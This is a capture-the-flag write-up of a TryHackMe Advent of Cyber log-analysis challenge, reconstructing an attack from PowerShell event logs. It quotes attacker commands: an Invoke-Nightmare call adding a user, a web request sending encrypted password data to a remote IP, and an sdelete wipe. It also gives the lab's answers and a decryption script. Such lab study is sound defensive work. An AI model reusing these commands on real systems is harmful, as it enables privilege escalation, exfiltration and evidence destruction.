---
title: Advent Of Cyber 3 - Day 23
date: "2021-12-23"
description: Log analysis, powershell scripting
tldr: Logs and powershell
tags: [powershell,log analysis,tryhackme,adventofcyber3,blueteam]

---

Deploy today's VM and start the program `Full Event Log View` to start analyzing some logs.


interesting links for further log analysis: 
-  [Investigating windows 2.0](https://tryhackme.com/jr/investigatingwindows2)[](https://tryhackme.com/jr/investigatingwindows2)
-  [Investigating Windows 3.x](https://tryhackme.com/jr/investigatingwindows3)[](https://tryhackme.com/jr/investigatingwindows3)
-  [PowerShell for Pentesters](https://tryhackme.com/jr/powershellforpentesters)


What command was executed as Elf McNealy to add a new user to the machine?
The log entry: `11/11/2021 7:23:41 PM.816` contains the information we want.
```powershell
Invoke-Nightmare -NewUser "caleb" -NewPassword "password" -DriverName "driver"
```
answer: `Invoke-Nightmare`

What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remove server?
The log entry: `11/11/2021 7:26:29 PM.376` contains the information we want.
![thm-aoc3-day22](/img/thm-aoc3-day23-1.png)
answer: `adm1n`

What was the IP address of the remote server? What was the port used for the remote connection? (format: IP,Port)
The log entry: `11/11/2021 7:27:44 PM.671` contains the information we want.
```powershell
ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://10.10.148.96:4321/"
```
answer: `10.10.148.96,4321`

What was the encryption key used to encrypt the contents of the text file sent to the remote server? 
The log entry: `11/11/2021 7:26:29 PM.376` contains the information we want.

```powershell
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("j3pn50vkw21hhurbqmxjlpmo9doiukyb")
```
answer: `j3pn50vkw21hhurbqmxjlpmo9doiukyb`

What application was used to delete the password.txt file?
The log entry: `11/11/2021 7:26:29 PM.376` contains the information we want.
```powershell
.\sdelete.exe -accepteula C:\Users\Administrator\desktop\password.txt
```
answer: `sdelete.exe`

What is the date and timestamp the logs show that password.txt was deleted? (format: MM/DD/YYYY H:MM:SS PM)
Search for logs that contain *sdelete.exe* and in the log event: `11/11/2021 7:29:27 PM.704` event we find the information needed.
answer: `11/11/2021 7:29:27 PM`

What were the contents of the deleted password.txt file?
The log entry: `11/11/2021 7:27:44 PM.671` contains the encrypted data, perhaps there's a way to reverse it since we have the key. 

```powershell
ParameterBinding(Invoke-WebRequest): name="Body"; value="76492d1116743f0423413b16050a5345MgB8AEcAVwB1AFMATwB1ADgALwA0AGQAKwBSAEYAYQBHAE8ANgBHAG0AcQBnAHcAPQA9AHwAMwBlADAAYwBmADAAYQAzAGEANgBmADkAZQA0ADUAMABiADkANgA4ADcAZgA3ADAAMQA3ADAAOABiADkAZAA2ADgAOQA2ADAANQA3AGEAZAA4AGMANQBjADIAMAA4ADYAYQA0ADMAMABkADkAMwBiADUAYQBhADIANwA5AGMAYQA1ADYAYQAzAGEAYQA2ADUAMABjADAAMwAzADYANABlADYAOAA4ADQAYwAxAGMAYwAxADkANwBiADIANAAzADMAMAAzADgAYQA5ADYANAAzADEANAA2AGUAZgBkAGEAMAA3ADcANQAyADcAZgBlADMAZQA3ADUANwAyADkAZAAwAGUAOQA5ADQAOQA1AGQAYQBkADEANQAxADYANwA2AGIAYQBjADAAMQA0AGEAOQA3ADYAYgBkAGMAOAAxAGMAZgA2ADYAOABjADEAMABmADcAZgAyADcAZgBjADEAYgA3AGYAOAA3AGIANQAyAGUAMwA4ADgAYQAxADkANgA4ADMA"
```

On the desktop there's a `decrypt.ps1` file, and it's missing a few parameters, lets fill them out. 

```powershell
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("j3pn50vkw21hhurbqmxjlpmo9doiukyb")

$encrypted = "76492d1116743f0423413b16050a5345MgB8AEcAVwB1AFMATwB1ADgALwA0AGQAKwBSAEYAYQBHAE8ANgBHAG0AcQBnAHcAPQA9AHwAMwBlADAAYwBmADAAYQAzAGEANgBmADkAZQA0ADUAMABiADkANgA4ADcAZgA3ADAAMQA3ADAAOABiADkAZAA2ADgAOQA2ADAANQA3AGEAZAA4AGMANQBjADIAMAA4ADYAYQA0ADMAMABkADkAMwBiADUAYQBhADIANwA5AGMAYQA1ADYAYQAzAGEAYQA2ADUAMABjADAAMwAzADYANABlADYAOAA4ADQAYwAxAGMAYwAxADkANwBiADIANAAzADMAMAAzADgAYQA5ADYANAAzADEANAA2AGUAZgBkAGEAMAA3ADcANQAyADcAZgBlADMAZQA3ADUANwAyADkAZAAwAGUAOQA5ADQAOQA1AGQAYQBkADEANQAxADYANwA2AGIAYQBjADAAMQA0AGEAOQA3ADYAYgBkAGMAOAAxAGMAZgA2ADYAOABjADEAMABmADcAZgAyADcAZgBjADEAYgA3AGYAOAA3AGIANQAyAGUAMwA4ADgAYQAxADkANgA4ADMA"

echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
```

result after running the script: `Mission Control: letitsnowletitsnowletitsnow`
which is the answer. 

EOF

